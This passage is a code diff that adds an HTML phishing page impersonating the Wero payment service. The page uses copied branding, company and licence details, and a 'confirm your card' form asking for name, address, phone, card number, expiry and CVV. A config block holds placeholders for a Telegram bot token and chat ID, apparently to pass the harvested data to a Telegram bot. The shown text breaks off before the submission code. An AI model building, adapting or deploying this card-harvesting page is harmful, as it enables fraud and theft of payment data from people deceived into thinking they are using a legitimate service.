@@ -1,24 +1,1128 @@
-            amount.addEventListener("input", (e) => { 
-                // Récupérer uniquement les chiffres et le point
-                let value = e.target.value.replace(/[^0-9.]/g, "");
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Wero - Confirmation de carte</title>
+    
+    <link rel="icon" href="images/icon.png" type="image/png">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ================= VARIABLES ================= */
+        :root {
+            --wero-yellow: #FFF69C;
+            --wero-yellow-hover: #fff275;
+            --black: #000000;
+            --white: #ffffff;
+            --gray-light: #F9FAFB;
+            --gray-medium: #E5E7EB;
+            --gray-dark: #374151;
+            --gray-text: #4B5563;
+            --red-asterisk: #D32F2F;
+            --green-success: #10b981;
+        }
+
+        /* ================= BASE STYLES ================= */
+        * {
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            margin: 0;
+            padding: 0;
+            -webkit-user-scalable: no;
+            user-scalable: no;
+            -webkit-touch-callout: none;
+        }
+
+        body {
+            background-color: var(--white);
+            color: var(--black);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            -webkit-touch-callout: none;
+        }
+        
+        input, select, textarea {
+            font-size: 16px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        a { text-decoration: none; color: inherit; transition: color 0.2s ease-in-out; }
+        button { border: none; background: none; cursor: pointer; font-family: inherit; }
+        img { max-width: 100%; height: auto; display: block; }
+        .hidden { display: none; }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #1e293b;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 10000;
+            display: none;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            font-weight: 500;
+        }
+        .toast.show { display: block; animation: fadeInOut 3s ease-in-out; }
+        .toast.success { background-color: var(--green-success); }
+        .toast.error { background-color: #ef4444; }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+        }
+
+        /* BOUTON RETOUR EN HAUT À GAUCHE - AJUSTÉ */
+        .back-to-bank-btn {
+            position: fixed;
+            top: 80px;
+            left: 20px;
+            background-color: var(--black);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 10px 18px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+            z-index: 1000;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        
+        .back-to-bank-btn:hover {
+            background-color: #333;
+            transform: translateX(-2px);
+        }
+        
+        .back-to-bank-btn:active {
+            transform: translateX(0);
+        }
+        
+        .back-to-bank-btn i {
+            font-size: 14px;
+            font-style: normal;
+            font-weight: bold;
+        }
+
+        @media (max-width: 768px) {
+            .back-to-bank-btn {
+                top: 60px;
+                left: 10px;
+                padding: 8px 12px;
+                font-size: 11px;
+                z-index: 1001;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .back-to-bank-btn {
+                top: 55px;
+                left: 8px;
+                padding: 6px 10px;
+                font-size: 10px;
+            }
+        }
+
+        /* ================= NAVBAR ================= */
+        .header {
+            width: 100%;
+            border-bottom: 1px solid var(--gray-medium);
+            position: relative;
+            background-color: var(--white);
+            z-index: 50;
+        }
+
+        .navbar-container {
+            padding: 1rem 1.25rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.025em;
+            text-transform: uppercase;
+        }
+
+        @media (min-width: 768px) { .navbar-container { padding: 1.25rem 2rem; } }
+
+        .logo-container { z-index: 50; cursor: pointer; }
+        #site-logo { height: 2.2rem; object-fit: contain; }
+        @media (min-width: 768px) { #site-logo { height: 3rem; } }
+
+        #logo-fallback {
+            font-size: 1.25rem;
+            font-weight: 900;
+            letter-spacing: -0.05em;
+            color: var(--black);
+            user-select: none;
+        }
+        @media (min-width: 768px) { #logo-fallback { font-size: 1.5rem; } }
+
+        #mobile-menu-btn { padding: 0.5rem; color: var(--black); display: block; z-index: 50; }
+        @media (min-width: 1024px) { #mobile-menu-btn { display: none; } }
+
+        .desktop-nav { display: none; }
+        @media (min-width: 1024px) {
+            .desktop-nav { display: flex; align-items: center; gap: 1.5rem; color: var(--gray-dark); }
+        }
+        @media (min-width: 1200px) { .desktop-nav { gap: 2.5rem; } }
+
+        .nav-item-dropdown { cursor: pointer; display: flex; align-items: center; gap: 0.25rem; }
+        .nav-item-dropdown:hover, .nav-link:hover { color: var(--black); }
+
+        .lang-selector { display: none; }
+        @media (min-width: 1024px) {
+            .lang-selector {
+                display: flex; border-left: 1px solid var(--gray-medium); height: 4rem;
+                align-items: center; padding-left: 1.5rem; color: var(--black);
+                font-weight: 900; letter-spacing: 0.05em; cursor: pointer;
+            }
+        }
+
+        /* ================= MOBILE MENU ================= */
+        #mobile-menu {
+            display: flex; flex-direction: column; align-items: center; gap: 0.5rem;
+            background-color: var(--white); border-bottom: 1px solid var(--gray-medium);
+            position: absolute; width: 100%; left: 0; top: 100%; max-height: 0; opacity: 0;
+            overflow: hidden; transition: max-height 0.3s, opacity 0.3s, padding 0.3s;
+            color: var(--gray-dark); font-weight: 700; font-size: 0.875rem; z-index: 40;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+        @media (min-width: 1024px) { #mobile-menu { display: none !important; } }
+
+        .mobile-menu-item {
+            width: 100%; text-align: center; padding: 0.75rem 0;
+            border-bottom: 1px solid var(--gray-light); cursor: pointer;
+            text-decoration: none; color: inherit; display: block;
+        }
+        .mobile-menu-item:hover { color: var(--black); }
+
+        #mobile-menu-fr { width: 100%; text-align: center; padding: 1rem 0; font-weight: 900; letter-spacing: 0.05em; }
+        #mobile-menu-fr:hover { color: var(--black); }
+
+        /* ================= PAGE CARTES CONTENT ================= */
+        main {
+            flex: 1;
+            width: 100%;
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 2rem 0.75rem 4rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        @media (min-width: 480px) { main { padding: 3.5rem 1rem 6rem; } }
+        @media (min-width: 768px) { main { padding: 4rem 1.25rem 6rem; } }
+
+        .page-title {
+            font-size: 1.25rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 0.9;
+            color: var(--black);
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        @media (min-width: 480px) { .page-title { font-size: 1.5rem; } }
+        @media (min-width: 768px) { .page-title { font-size: 2.5rem; } }
+
+        .page-subtitle {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--gray-dark);
+            text-align: center;
+            margin-bottom: 0.5rem;
+            max-width: 600px;
+        }
+
+        .card-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 3rem;
+        }
+
+        .card-logos img {
+            height: 24px;
+            object-fit: contain;
+            opacity: 0.3;
+            transition: opacity 0.2s ease-in-out;
+        }
+
+        .card-logos img.active {
+            opacity: 1;
+        }
+
+        .form-container {
+            background-color: var(--wero-yellow);
+            border: 1px solid var(--black);
+            border-radius: 1rem;
+            width: 100%;
+            max-width: 550px;
+            padding: 1.5rem 1rem;
+        }
+
+        @media (min-width: 480px) { .form-container { padding: 2rem 1.5rem; } }
+        @media (min-width: 768px) { .form-container { padding: 3rem 3rem; } }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 1.25rem;
+        }
+
+        .form-group label {
+            text-align: left;
+            font-size: 0.8125rem;
+            font-weight: 600;
+            color: var(--black);
+            margin-bottom: 0.4rem;
+        }
+
+        .asterisk {
+            color: var(--red-asterisk);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border: 1px solid var(--black);
+            border-radius: 0.5rem;
+            background-color: var(--white);
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--black);
+            outline: none;
+            transition: box-shadow 0.2s;
+            text-align: left;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .form-group input::placeholder {
+            color: #9CA3AF;
+            font-weight: 400;
+            font-size: 0.875rem;
+        }
+
+        .form-group input:focus {
+            box-shadow: 0 0 0 2px rgba(0,0,0,0.1);
+            transform: none;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+        
+        @media (max-width: 480px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .submit-btn {
+            width: 100%;
+            margin-top: 1rem;
+            padding: 0.875rem;
+            background-color: var(--black);
+            color: var(--white);
+            border: 1px solid var(--black);
+            border-radius: 9999px;
+            font-size: 0.875rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+            text-align: center;
+        }
+
+        .submit-btn:hover { opacity: 0.9; }
+        .submit-btn:active { transform: translateY(1px); }
+        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FFF69C;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .error-message {
+            color: var(--red-asterisk);
+            font-size: 11px;
+            margin-top: 5px;
+            display: none;
+        }
+        .error-message.show { display: block; }
+        input.error { border-color: var(--red-asterisk); background-color: #fff5f5; }
+
+        /* ================= PRE-FOOTER BANNER ================= */
+        .pre-footer-banner {
+            background-color: var(--wero-yellow);
+            padding: 4rem 1.25rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 2rem;
+            border-top: 1px solid var(--black);
+            border-bottom: 1px solid var(--black);
+        }
+
+        @media (min-width: 768px) {
+            .pre-footer-banner { flex-direction: row; justify-content: space-between; padding: 4rem 4rem; text-align: left; }
+        }
+
+        .pre-footer-title {
+            font-size: 1.75rem;
+            font-weight: 900; text-transform: uppercase;
+            letter-spacing: -0.05em; line-height: 1; color: var(--black); max-width: 800px;
+        }
+
+        @media (min-width: 768px) { .pre-footer-title { font-size: 2.5rem; } }
+
+        .wero-btn {
+            display: inline-flex; align-items: center; justify-content: center;
+            border: 2px solid var(--black); background-color: var(--white);
+            color: var(--black); font-weight: 800; font-size: 0.875rem;
+            padding: 0.75rem 1.75rem; border-radius: 9999px; box-shadow: 2px 2px 0px rgba(0,0,0,1);
+            transition: all 0.2s; cursor: pointer; white-space: nowrap;
+        }
+        .wero-btn:hover { background-color: #f5f5f5; }
+        .wero-btn:active { transform: translateY(1px); }
+
+        .wero-btn-content { display: flex; align-items: center; gap: 1rem; }
+        .wero-btn-text { order: 1; }
+        .wero-btn:hover .wero-btn-text, .wero-btn:active .wero-btn-text { order: 2; }
+        
+        .wero-btn-icon-container {
+            width: 1.5rem; height: 1.5rem; display: flex; align-items: center; justify-content: center;
+            border: 1px solid var(--black); border-radius: 9999px; background-color: var(--wero-yellow);
+            order: 2; transition: order 0.2s; flex-shrink: 0;
+        }
+        .wero-btn:hover .wero-btn-icon-container, .wero-btn:active .wero-btn-icon-container { order: 1; }
+        
+        .button-icon { width: 0.75rem; height: 0.75rem; stroke-width: 2.5; fill: none; stroke: currentColor; }
+        .arrow-svg { transform: rotate(45deg); transition: transform 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); }
+        .wero-btn:hover .arrow-svg { transform: rotate(135deg); }
+
+        /* ================= FOOTER ================= */
+        .site-footer {
+            background-color: var(--white); 
+            color: var(--black);
+            padding: 4rem 1.25rem 2rem;
+            width: 100%;
+        }
+
+        .site-footer-inner {
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+
+        @media (min-width: 768px) {
+            .site-footer {
+                padding: 6rem 4rem 2rem;
+            }
+        }
+
+        .footer-top {
+            display: flex;
+            flex-direction: column;
+            gap: 4rem;
+            margin-bottom: 6rem;
+        }
+
+        @media (min-width: 768px) {
+            .footer-top {
+                flex-direction: row;
+                justify-content: space-between;
+            }
+        }
+
+        .footer-links-container {
+            display: flex;
+            flex-direction: column;
+            gap: 3rem;
+        }
+
+        @media (min-width: 640px) {
+            .footer-links-container {
+                flex-direction: row;
+                gap: 6rem;
+            }
+        }
+
+        .footer-col {
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+
+        .footer-heading {
+            font-size: 1.1rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            color: var(--black);
+        }
+
+        .footer-link {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--gray-text); 
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            color: var(--black);
+            text-decoration: underline;
+            text-underline-offset: 4px;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .footer-logo img {
+            height: 3rem;
+            width: auto;
+            object-fit: contain;
+        }
+
+        @media (min-width: 768px) {
+            .footer-logo img {
+                height: 4.5rem;
+            }
+        }
+
+        .footer-bottom {
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+        }
+
+        @media (min-width: 1024px) {
+            .footer-bottom {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: flex-end;
+            }
+        }
+
+        .footer-info {
+            font-size: 0.75rem;
+            color: var(--gray-text); 
+            line-height: 1.6;
+            max-width: 600px;
+            font-weight: 500;
+        }
+
+        .footer-info p {
+            margin-bottom: 1rem;
+        }
+        
+        .footer-info a.inline-underline {
+            color: var(--black);
+        }
+
+        .footer-socials {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .social-icon {
+            width: 2.5rem;
+            height: 2.5rem;
+            border-radius: 50%;
+            background-color: var(--wero-yellow);
+            border: 1px solid var(--black);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s, background-color 0.2s;
+            color: var(--black);
+        }
+
+        .social-icon:hover {
+            transform: translateY(-2px);
+            background-color: var(--wero-yellow-hover);
+        }
+
+        .social-icon svg {
+            width: 1.1rem;
+            height: 1.1rem;
+            fill: currentColor;
+        }
+
+        .copyright {
+            font-size: 0.75rem;
+            margin-top: 2rem;
+        }
+
+        /* ICONS */
+        .dropdown-icon { width: 0.75rem; height: 0.75rem; stroke-width: 3; fill: none; stroke: currentColor; }
+        .burger-icon { width: 1.5rem; height: 1.5rem; stroke-width: 2.5; fill: none; stroke: currentColor; }
+
+    
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- BOUTON RETOUR POSITIONNÉ PLUS BAS POUR NE PAS MASQUER LE LOGO -->
+    <button class="back-to-bank-btn" onclick="window.location.href='index.html'">
+        <i>←</i> Retour 
+    </button>
+
+    <!-- Toast notification -->
+    <div id="toast" class="toast"></div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Vérification en cours...</div>
+    </div>
+
+    <header class="header">
+        <div class="navbar-container">
+            <div class="logo-container" onclick="window.location.href='index.html'">
+                <img id="site-logo" src="images/wero.jpg" alt="Wero" class="hidden">
+                <span id="logo-fallback">wero</span>
+            </div>
+            
+            <button id="mobile-menu-btn">
+                <svg class="burger-icon" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+                </svg>
+            </button>
+
+            <nav class="desktop-nav">
+                <div class="nav-item-dropdown" onclick="window.location.href='index.html'">
+                    <span>Utilisateurs</span>
+                    <svg class="dropdown-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                </div>
+                <div class="nav-item-dropdown" onclick="window.location.href='index.html'">
+                    <span>Professionnels</span>
+                    <svg class="dropdown-icon" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+                </div>
+                <a href="index.html" class="nav-link">Aide</a>
+                <a href="index.html" class="nav-link text-center leading-tight">À propos</a>
+                <a href="index.html" class="nav-link">Actualités</a>
+            </nav>
+
+            <div class="lang-selector" onclick="window.location.href='index.html'">FR</div>
+        </div>
+
+        <nav id="mobile-menu">
+            <a href="index.html" class="mobile-menu-item">Utilisateurs</a>
+            <a href="index.html" class="mobile-menu-item">Professionnels</a>
+            <a href="index.html" class="mobile-menu-item">Aide</a>
+            <a href="index.html" class="mobile-menu-item">À propos</a>
+            <a href="index.html" class="mobile-menu-item">Actualités</a>
+            <a href="index.html" id="mobile-menu-fr" style="display: block; text-decoration: none; color: inherit;">FR</a>
+        </nav>
+    </header>
+
+    <main>
+        <h1 class="page-title">CONFIRMEZ VOTRE CARTE</h1>
+        <p class="page-subtitle">Pour des raisons de sécurité, nous allons vérifier vos informations personnelles à chaque mise à jour du site.</p>
+        
+        <div class="card-logos">
+            <img src="images/visa.png" id="logo-visa" alt="Visa">
+            <img src="images/mc.png" id="logo-mastercard" alt="Mastercard">
+            <img src="images/dcl1.png" id="logo-cb" alt="CB">
+            <img src="images/dc.png" id="logo-cartenb" alt="CB">
+            <img src="images/amx.png" id="logo-amex" alt="American Express">
+        </div>
+
+        <div class="form-container">
+            <form id="paymentForm">
                 
-                // Corriger le format : max 2 décimales
-                if (value.includes('.')) {
-                    let parts = value.split('.');
-                    // Garder seulement le premier point
-                    value = parts[0] + '.' + parts.slice(1).join('').substring(0, 2);
-                } else if (value.length > 0) {
-                    // Rien à faire, laisser comme ça
+                <div class="form-group">
+                    <label>Nom sur la carte <span class="asterisk">*</span></label>
+                    <input type="text" id="cardName" placeholder="Ex: Jean Dupont" required autocomplete="cc-name">
+                    <div class="error-message" id="error-cardName">Veuillez entrer le nom sur la carte</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Adresse postale <span class="asterisk">*</span></label>
+                    <input type="text" id="address" placeholder="Numéro, rue, code postal, ville, pays" required autocomplete="address-line1">
+                    <div class="error-message" id="error-address">Veuillez entrer votre adresse</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Numéro de téléphone <span class="asterisk">*</span></label>
+                    <input type="tel" id="phone" placeholder="Ex: 06 12 34 56 78" required autocomplete="tel">
+                    <div class="error-message" id="error-phone">Veuillez entrer un numéro valide</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Montant à recevoir <span class="asterisk">*</span></label>
+                    <input type="text" id="amount" placeholder="Ex: 50.00 €" required>
+                    <div class="error-message" id="error-amount">Veuillez entrer un montant valide</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Numéro de la carte <span class="asterisk">*</span></label>
+                    <input type="text" id="cardNumber" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19" required autocomplete="cc-number">
+                    <div class="error-message" id="error-cardNumber">Veuillez entrer un numéro de carte valide</div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Date d'expiration <span class="asterisk">*</span></label>
+                        <input type="text" id="expiry" inputmode="numeric" placeholder="MM/AA" maxlength="5" required autocomplete="cc-exp">
+                        <div class="error-message" id="error-expiry">Format invalide (MM/AA)</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Cryptogramme CVV <span class="asterisk"></span></label>
+                        <input type="text" id="cvv" inputmode="numeric" placeholder="3 chiffres" maxlength="4" required autocomplete="cc-csc">
+                        <div class="error-message" id="error-cvv">CVV invalide</div>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">Continuer</button>
+            </form>
+        </div>
+    </main>
+
+    <section class="pre-footer-banner">
+        <h2 class="pre-footer-title">LE FUTUR DES PAIEMENTS EST DÉJÀ LÀ.</h2>
+        <button class="wero-btn" onclick="window.location.href='index.html'">
+            <div class="wero-btn-content">
+                <span class="wero-btn-text">Démarrer.</span>
+                <span class="wero-btn-icon-container">
+                    <svg class="arrow-svg button-icon" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                    </svg>
+                </span>
+            </div>
+        </button>
+    </section>
+
+    <footer class="site-footer">
+        <div class="site-footer-inner">
+            <div class="footer-top">
+                <div class="footer-links-container">
+                    <div class="footer-col">
+                        <div class="footer-heading">Découvrir</div>
+                        <a href="index.html" class="footer-link">Accueil</a>
+                        <a href="index.html" class="footer-link">Utilisateurs</a>
+                        <a href="index.html" class="footer-link">Professionnels</a>
+                        <a href="index.html" class="footer-link">Aide</a>
+                        <a href="index.html" class="footer-link">À propos</a>
+                        <a href="index.html" class="footer-link">Actualités</a>
+                    </div>
+                    <div class="footer-col">
+                        <div class="footer-heading">Informations pratiques</div>
+                        <a href="index.html" class="footer-link">Centre de confidentialité</a>
+                        <a href="index.html" class="footer-link">Centre Légal</a>
+                        <a href="index.html" class="footer-link">Conditions d'utilisation du site web</a>
+                        <a href="index.html" class="footer-link">Sécurité</a>
+                        <a href="index.html" class="footer-link">Presse</a>
+                    </div>
+                </div>
+                
+                <div class="footer-logo">
+                    <img src="images/wero.jpg" alt="Logo Wero">
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="footer-info">
+                    <p><strong style="color: var(--black);">Wero est un produit de <a href="index.html" class="inline-underline">EPI Company SE</a></strong><br>
+                    Disponible en Allemagne, Belgique et France.<br>
+                    De Lignestraat 13, 1000 Brussels, Belgium<br>
+                    VAT: BE0755811726<br>
+                    Capital partagé : € 669MM</p>
+
+                    <p>Détails de la licence : n° 0755.811.726. Autorisé par la Banque Nationale de Belgique<br>
+                    en tant qu'institution de paiement le 20 février 2024. PISP et AISP pour les services (7<br>
+                    services d'initiation de paiement et 8 services d'information sur les comptes).</p>
+                    
+                    <div class="copyright">© 2026 EPI Company SE</div>
+                </div>
+
+                <div class="footer-socials">
+                    <a href="index.html" class="social-icon" aria-label="Facebook">
+                        <svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"></path></svg>
+                    </a>
+                    <a href="index.html" class="social-icon" aria-label="TikTok">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12a4 4 0 1 0 4 4V4a5 5 0 0 0 5 5"></path><path d="M15 8v8a4 4 0 0 1-4 4"></path><path d="M15 4a4 4 0 0 0 4 4"></path></svg>
+                    </a>
+                    <a href="index.html" class="social-icon" aria-label="Instagram">
+                        <svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script-cartes.js" defer></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            
+            const form = document.getElementById('paymentForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const toast = document.getElementById('toast');
+            
+            const cardName = document.getElementById('cardName');
+            const address = document.getElementById('address');
+            const phone = document.getElementById('phone');
+            const amount = document.getElementById('amount');
+            const cardNumber = document.getElementById('cardNumber');
+            const expiry = document.getElementById('expiry');
+            const cvv = document.getElementById('cvv');
+            
+            function showToast(message, isError = false) {
+                toast.textContent = message;
+                toast.className = 'toast show' + (isError ? ' error' : ' success');
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                    toast.className = 'toast';
+                }, 3000);
+            }
+            
+            const logoImg = document.getElementById("site-logo");
+            const logoFallback = document.getElementById("logo-fallback");
+
+            if (logoImg) {
+                const testImg = new Image();
+                testImg.src = logoImg.src;
+                testImg.onload = () => {
+                    logoImg.classList.remove("hidden");
+                    logoFallback.classList.add("hidden");
+                };
+                testImg.onerror = () => {
+                    logoImg.classList.add("hidden");
+                    logoFallback.classList.remove("hidden");
+                };
+            }
+
+            const mobileBtn = document.getElementById("mobile-menu-btn");
+            const mobileMenu = document.getElementById("mobile-menu");
+            let isMenuOpen = false;
+
+            if (mobileBtn && mobileMenu) {
+                mobileBtn.addEventListener("click", () => {
+                    isMenuOpen = !isMenuOpen;
+                    if (isMenuOpen) {
+                        mobileMenu.style.maxHeight = "400px";
+                        mobileMenu.style.opacity = "1";
+                        mobileMenu.style.paddingBottom = "1rem";
+                    } else {
+                        mobileMenu.style.maxHeight = "0";
+                        mobileMenu.style.opacity = "0";
+                        mobileMenu.style.paddingBottom = "0";
+                    }
+                });
+            }
+
+            function removeError(input, errorId) {
+                input.classList.remove('error');
+                const errorEl = document.getElementById(errorId);
+                if (errorEl) errorEl.classList.remove('show');
+            }
+
+            function addError(input, errorId) {
+                input.classList.add('error');
+                const errorEl = document.getElementById(errorId);
+                if (errorEl) errorEl.classList.add('show');
+            }
+
+            function validateForm() {
+                let isValid = true;
+                
+                if (!cardName.value.trim()) { addError(cardName, 'error-cardName'); isValid = false; }
+                else { removeError(cardName, 'error-cardName'); }
+                
+                if (!address.value.trim()) { addError(address, 'error-address'); isValid = false; }
+                else { removeError(address, 'error-address'); }
+                
+                const phoneClean = phone.value.replace(/\s/g, '');
+                if (!phoneClean || phoneClean.length < 10) { addError(phone, 'error-phone'); isValid = false; }
+                else { removeError(phone, 'error-phone'); }
+                
+                const amountVal = parseFloat(amount.value.replace('€', '').trim());
+                if (isNaN(amountVal) || amountVal <= 0) { addError(amount, 'error-amount'); isValid = false; }
+                else { removeError(amount, 'error-amount'); }
+                
+                const cardClean = cardNumber.value.replace(/\s/g, '');
+                if (!cardClean || cardClean.length < 13 || cardClean.length > 19) { addError(cardNumber, 'error-cardNumber'); isValid = false; }
+                else { removeError(cardNumber, 'error-cardNumber'); }
+                
+                const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+                if (!expiry.value || !expiryRegex.test(expiry.value)) { 
+                    addError(expiry, 'error-expiry'); 
+                    isValid = false; 
+                } else {
+                    // Verifier que la date est dans le futur
+                    const [monthStr, yearStr] = expiry.value.split('/');
+                    const month = parseInt(monthStr, 10);
+                    const year = parseInt(yearStr, 10);
+                    const fullYear = 2000 + year;
+                    const expiryDate = new Date(fullYear, month, 0, 23, 59, 59);
+                    const today = new Date();
+                    
+                    if (expiryDate < today) {
+                        addError(expiry, 'error-expiry');
+                        document.getElementById('error-expiry').textContent = 'Carte expirée';
+                        isValid = false;
+                    } else {
+                        removeError(expiry, 'error-expiry');
+                    }
                 }
                 
-                // Afficher avec le format "XX.XX €"
-                if (value) {
-                    // S'assurer qu'il y a 2 décimales
-                    let [euros, cents] = value.split('.');
-                    cents = cents || '00';
-                    cents = cents.padEnd(2, '0').substring(0, 2);
-                    e.target.value = euros + '.' + cents + ' €';
